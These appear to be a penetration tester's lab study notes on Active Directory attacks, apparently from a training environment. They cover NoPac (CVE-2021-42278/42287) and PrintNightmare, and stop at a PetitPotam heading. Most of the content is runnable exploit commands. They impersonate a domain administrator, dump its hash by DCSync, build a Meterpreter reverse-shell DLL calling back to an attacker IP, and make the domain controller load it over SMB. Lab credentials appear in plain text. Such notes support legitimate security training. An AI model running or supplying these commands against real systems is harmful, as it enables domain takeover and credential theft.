
## **NoPac Attack Summary (CVE-2021-42278 + CVE-2021-42287)** [Tool](https://github.com/Ridter/noPac)

The NoPac attack abuses vulnerabilities in Active Directory where an attacker with low privileges can rename a computer accountâ€™s `sAMAccountName` to impersonate a domain admin, then request a Kerberos ticket that the Domain Controller mistakenly issues with elevated privileges. This results in full domain compromise without needing existing admin rights.


### âœ… **Requirements**

- Unpatched **Domain Controller** (Windows Server 2016/2019) for **both CVEs**
- Attacker has **low-privileged domain user** credentials
- Domain allows creation or control of **computer accounts** (default: up to 10)
- **Kerberos authentication** is used (default in AD)

---

### ðŸ§­ **Attack Steps** [Article](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)

1. Attacker creates or compromises a computer account (e.g., `TESTCOMP$`)
2. Modifies the computer accountâ€™s `sAMAccountName` to `Administrator` (or another DA)
3. Requests a **TGT** from the KDC for the renamed machine account
4. Due to the vulnerability, the KDC issues a **TGT for the real domain admin account**
5. Attacker uses this TGT to **impersonate a domain admin**, achieving **full domain access**

```shell
[[sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap]]
# Check if target is vulnerable

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
# Impersonate admin

# DCSYNC ATTACK
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
# DCSYNC ATTACK

```


## PrintNightmare:
==->== Depending on what exploit you use the version of impacket may need to be changed ==<-==
1. 
![[Pasted image 20250620151700.png]]
^^ see ifÂ `Print System Asynchronous Protocol`Â andÂ `Print System Remote Protocol`Â are exposed on the target.

2. 
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
# Create an msfvenom payload


sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
# Host a payload on an smb share

```

3. Setup a reverse shell listener with Metasploit
![[Pasted image 20250620152044.png]]

4. Run the payload
```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

# What this is doing:
1. Run the CVE against the target (172.16.5.5)
2. Grab the .dll hosted on our machine
3. run that .dll and
4. Get a shell from our listener on MSF

```

## PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))
